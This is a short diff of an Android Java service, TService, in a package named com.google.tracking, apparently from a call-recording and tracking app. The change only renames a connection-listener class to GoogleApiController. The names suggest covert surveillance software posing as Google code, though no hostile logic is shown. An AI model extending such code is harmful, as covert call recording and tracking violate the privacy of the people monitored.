@@ -19,7 +19,7 @@ import com.google.tracking.call.CallRecorderController;
 import com.google.tracking.constants.TrackingConstants;
 import com.google.tracking.runnable.RepeatingTask;
 import com.google.tracking.sender.DataSender;
-import com.google.tracking.google_api.ApiConnectionListener;
+import com.google.tracking.google_api.GoogleApiController;
 
 import java.io.*;
 
@@ -143,10 +143,10 @@ public class TService extends Service {
     }
 
     private GoogleApiClient mGoogleApiClient;
-    private ApiConnectionListener mApiConnectionListener;
+    private GoogleApiController mApiConnectionListener;
     private void createGoolApiClient() {
         // Create an instance of GoogleAPIClient.
-        mApiConnectionListener = new ApiConnectionListener();
+        mApiConnectionListener = new GoogleApiController();
         if (mGoogleApiClient == null) {
             mGoogleApiClient = new GoogleApiClient.Builder(this)
                     .addConnectionCallbacks(mApiConnectionListener)
